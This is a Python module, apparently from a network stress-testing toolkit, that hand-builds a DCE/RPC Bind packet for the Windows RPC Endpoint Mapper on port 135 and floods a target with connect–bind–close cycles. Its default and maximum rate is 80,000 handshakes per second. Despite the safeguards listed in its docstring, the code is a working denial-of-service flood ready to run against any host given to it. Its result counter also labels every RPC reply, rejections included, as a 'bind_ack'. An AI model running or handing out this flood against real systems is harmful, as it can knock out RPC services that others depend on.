"""
測項：MS-RPC Endpoint Mapper (EPM) Bind PDU 洪水
分類：RPC（預設埠 135/TCP，MS-RPC Endpoint Mapper）
說明：手動組出最小 DCE/RPC Bind PDU（依公開的 [C706] DCE 1.1 RPC 規格 與
     [MS-RPCE] 文件），將介面 UUID 指定為 Endpoint Mapper 本身
     （e1af8308-5d1f-11c9-91a4-08002b14a0fa, version 3.0），傳輸語法採 NDR
     （8a885d04-1ceb-11c9-9fe8-08002b104860, version 2.0）。連線 -> 送出
     bind -> 讀取 bind_ack/bind_nak -> 關閉，重複執行，測試 RPC Endpoint
     Mapper 服務對 bind 交握的處理能力。

安全設計 / 限制說明：
  - 這裡的 DCE/RPC 位元組是「best-effort 最小 bind 封包」，只依公開規格手刻，
    並未針對所有 Windows 版本 / Samba rpcbind 等各種 RPC 實作逐一驗證相容性，
    測試結果（是否收到 bind_ack）僅供參考，不代表完整協定合規性測試。
  - 全程不涉及任何驗證資訊（auth_length 固定為 0，不使用 NTLM/Kerberos 認證
    延伸），不嘗試任何帳號密碼，純粹是連線與 bind 階段的負載測試。
  - 不偽造來源位址，所有連線皆由執行本測試的機器真實發起。
  - 速率透過 RateLimiter 控制；duration 經 clamp_duration() 限制。
需求：無額外套件，僅使用標準函式庫 socket / uuid / struct。
"""
import socket
import struct
import time
import uuid

from ..common import RateLimiter, clamp_duration

NAME = "MS-RPC EPM Bind PDU 洪水"
CATEGORY = "RPC"
PROTOCOL = "TCP"
DEFAULT_PORT = 135
TEST_TYPE = "resource"  # 連線建立 + Bind 交握 + 關閉循環（churn）

_EPM_UUID = uuid.UUID("e1af8308-5d1f-11c9-91a4-08002b14a0fa")
_EPM_VERSION_MAJOR = 3
_EPM_VERSION_MINOR = 0
_NDR_UUID = uuid.UUID("8a885d04-1ceb-11c9-9fe8-08002b104860")
_NDR_VERSION = 2


def _build_bind_pdu(call_id: int) -> bytes:
    """組出最小 DCE/RPC Bind PDU（packet type = 11），單一 context item，
    介面固定指向 Endpoint Mapper，傳輸語法固定為 NDR。"""
    p_cont_elem = (
        struct.pack("<H", 0)  # context id
        + struct.pack("<B", 1)  # num_trans_items
        + b"\x00"  # reserved
        + _EPM_UUID.bytes_le
        + struct.pack("<H", _EPM_VERSION_MAJOR)
        + struct.pack("<H", _EPM_VERSION_MINOR)
        + _NDR_UUID.bytes_le
        + struct.pack("<I", _NDR_VERSION)
    )
    body = (
        struct.pack("<H", 0x1000)  # max_xmit_frag
        + struct.pack("<H", 0x1000)  # max_recv_frag
        + struct.pack("<I", 0)  # assoc_group_id
        + struct.pack("<B", 1)  # num_context_items
        + b"\x00\x00\x00"  # reserved x3
        + p_cont_elem
    )
    header = (
        b"\x05\x00"  # version major/minor
        + b"\x0b"  # packet type = bind
        + b"\x03"  # packet flags：first frag + last frag
        + b"\x10\x00\x00\x00"  # data representation：little-endian/ASCII/IEEE
        + struct.pack("<H", 16 + len(body))  # frag length
        + struct.pack("<H", 0)  # auth length（不使用任何認證延伸）
        + struct.pack("<I", call_id)
    )
    return header + body


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {
            "type": "int", "default": 80000, "min": 1, "max": 80000,
            "desc": "每秒建立的連線 + Bind 交握次數",
        },
        "connect_timeout": {
            "type": "float", "default": 2.0, "min": 0.5, "max": 5.0,
            "desc": "單次連線/收送逾時秒數",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 150))
    timeout = float(params.get("connect_timeout", 2.0))

    limiter = RateLimiter(rate)
    stats = {"connected": 0, "bind_ack": 0, "no_response": 0, "errors": 0}
    call_id = 1
    start = time.time()

    log_fn(f"[+] MS-RPC EPM Bind 洪水 -> {target}:{port} @ {rate}/s, {duration}s（best-effort 最小探測封包，不涉及任何認證）")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))
            stats["connected"] += 1
            s.sendall(_build_bind_pdu(call_id))
            call_id = (call_id + 1) & 0xFFFFFFFF
            resp = s.recv(4096)
            # packet type 12 = bind_ack, 13 = bind_nak；只要有合法的 DCE/RPC 回應
            # header（version=5）即視為對方有回覆 bind 交握。
            if resp and len(resp) >= 3 and resp[0] == 0x05:
                stats["bind_ack"] += 1
            else:
                stats["no_response"] += 1
        except OSError as e:
            stats["errors"] += 1
            if stats["errors"] <= 5:
                log_fn(f"[!] 連線錯誤：{e}")
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    return {
        "connected": stats["connected"],
        "bind_ack": stats["bind_ack"],
        "no_response": stats["no_response"],
        "errors": stats["errors"],
        "elapsed_sec": round(time.time() - start, 1),
    }
